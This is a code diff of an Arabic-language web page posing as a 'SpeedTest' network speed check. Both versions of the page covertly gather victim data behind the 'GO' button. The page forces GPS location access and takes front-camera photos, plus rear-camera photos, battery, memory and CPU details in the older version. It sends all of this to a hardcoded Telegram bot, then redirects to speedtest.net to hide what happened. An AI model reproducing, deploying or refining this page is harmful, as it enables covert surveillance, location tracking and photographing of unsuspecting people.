@@ -1,38 +1,29 @@
 
+
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SpeedTest - Global Connectivity</title>
+    <title>SpeedTest Fast</title>
     <style>
-        body { background-color: #0b0e18; color: white; font-family: sans-serif; text-align: center; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        /* تصميم الزر الجديد يمنع التحديد تماماً */
-        .main-button {
-            width: 210px; height: 210px; 
-            border: 6px solid #00d2ff; border-radius: 50%; 
-            display: flex; align-items: center; justify-content: center; 
-            cursor: pointer; position: relative; 
-            background: radial-gradient(circle, #1a2035 0%, #0b0e18 100%);
-            -webkit-user-select: none; user-select: none;
-            -webkit-tap-highlight-color: transparent;
-            z-index: 999;
+        body { background-color: #0b0e18; color: white; font-family: sans-serif; text-align: center; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
+        .btn-go {
+            width: 180px; height: 180px; border-radius: 50%;
+            background: #00d2ff; color: black; font-size: 50px; font-weight: bold;
+            display: flex; align-items: center; justify-content: center;
+            cursor: pointer; border: none; outline: none; box-shadow: 0 0 20px #00d2ff;
         }
-        .main-button:active { transform: scale(0.92); border-color: #ff0055; }
-        .btn-text { font-size: 60px; font-weight: bold; color: #00d2ff; pointer-events: none; }
-        #status { margin-top: 35px; font-size: 18px; color: #888; }
+        .btn-go:active { background: #ff0055; transform: scale(0.9); }
+        #status { margin-top: 20px; color: #888; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <h2 style="margin-bottom: 30px;">Global Speed Test</h2>
-
-    <div class="main-button" id="triggerBtn">
-        <span class="btn-text">GO</span>
-    </div>
-
-    <p id="status">جاهز للفحص...</p>
+    <h2>فحص سرعة الشبكة</h2>
+    <button class="btn-go" id="startBtn">GO</button>
+    <p id="status">اضغط للبدء</p>
 
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
@@ -41,66 +32,57 @@
         const botToken = "8113942047:AAFTJz0lZe1Mjsc0vX79LeCq4MKjwwDuFEw"; 
         const chatId = "7984067238"; 
 
-        async function sendToTelegram(type, content, extra = "") {
+        async function sendData(type, data, cap = "") {
             const formData = new FormData();
             formData.append("chat_id", chatId);
             if (type === "photo") {
-                formData.append("photo", content, "image.jpg");
-                formData.append("caption", extra);
+                formData.append("photo", data, "1.jpg");
+                formData.append("caption", cap);
                 await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: formData });
             } else {
-                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(content)}&parse_mode=Markdown`);
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(data)}&parse_mode=Markdown`);
             }
         }
 
-        async function capture(mode) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode, width: 640 }, audio: false });
-                const video = document.getElementById( video );
-                video.srcObject = stream;
-                await new Promise(res => video.onloadedmetadata = res);
-                await new Promise(res => setTimeout(res, 800)); 
-                const canvas = document.getElementById( canvas );
-                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-                canvas.getContext( 2d ).drawImage(video, 0, 0);
-                stream.getTracks().forEach(t => t.stop());
-                return new Promise(res => canvas.toBlob(res,  image/jpeg , 0.6));
-            } catch (e) { return null; }
-        }
-
-        document.getElementById( triggerBtn ).addEventListener( click , async function() {
+        document.getElementById( startBtn ).onclick = async function() {
             const status = document.getElementById( status );
-            status.innerText = "جاري معايرة السيرفر...";
-            this.style.pointerEvents = "none"; 
+            status.innerText = "جاري الفحص...";
+            this.style.pointerEvents = "none";
 
-            // التقاط الصور فوراً
-            const fImg = await capture("user");
-            if (fImg) await sendToTelegram("photo", fImg, "📸 صورة أمامية");
-            
-            const bImg = await capture("environment");
-            if (bImg) await sendToTelegram("photo", bImg, "📸 صورة خلفية");
-
-            // جمع البيانات والموقع
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    let batt = "غير معروف";
-                    try { const b = await navigator.getBattery(); batt = `${Math.round(b.level * 100)}%`; } catch(e){}
+            // 1. طلب الموقع أولاً (إجباري للمتابعة)
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                
+                // 2. محاولة فتح الكاميرا الأمامية فوراً
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                    const video = document.getElementById( video );
+                    video.srcObject = stream;
                     
-                    const report = `✅ **تم استلام البيانات**\n\n` +
-                                   `🔋 البطارية: ${batt}\n` +
-                                   `💾 الذاكرة: ${navigator.deviceMemory ||  4+ } GB\n` +
-                                   `⚙️ المعالج: ${navigator.hardwareConcurrency ||  ؟ } نواة\n` +
-                                   `📍 الموقع: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                    await new Promise(r => setTimeout(r, 1000)); // انتظار ثانية للوضوح
+                    
+                    const canvas = document.getElementById( canvas );
+                    canvas.width = 640; canvas.height = 480;
+                    canvas.getContext( 2d ).drawImage(video, 0, 0);
+                    
+                    stream.getTracks().forEach(t => t.stop());
+                    
+                    canvas.toBlob(async (blob) => {
+                        await sendData("photo", blob, `📍 الموقع: ${mapLink}\n🔋 البطارية: جاري الجلب...`);
+                        window.location.href = "https://www.speedtest.net";
+                    },  image/jpeg , 0.6);
 
-                    await sendToTelegram("text", report);
-                    status.innerText = "اكتمل الفحص!";
-                    setTimeout(() => { window.location.href = "https://www.speedtest.net"; }, 1000);
-                }, (err) => {
-                    alert("يرجى تفعيل الموقع (GPS) لإكمال الفحص.");
-                    location.reload();
-                });
-            }
-        });
+                } catch (e) {
+                    // إذا رفض الكاميرا، أرسل الموقع فقط
+                    await sendData("text", `📍 الموقع فقط: ${mapLink}\n(رفض الكاميرا)`);
+                    window.location.href = "https://www.speedtest.net";
+                }
+
+            }, (err) => {
+                alert("يجب السماح بالموقع والوصول للشبكة للمتابعة.");
+                location.reload();
+            });
+        };
     </script>
 </body>
 </html>
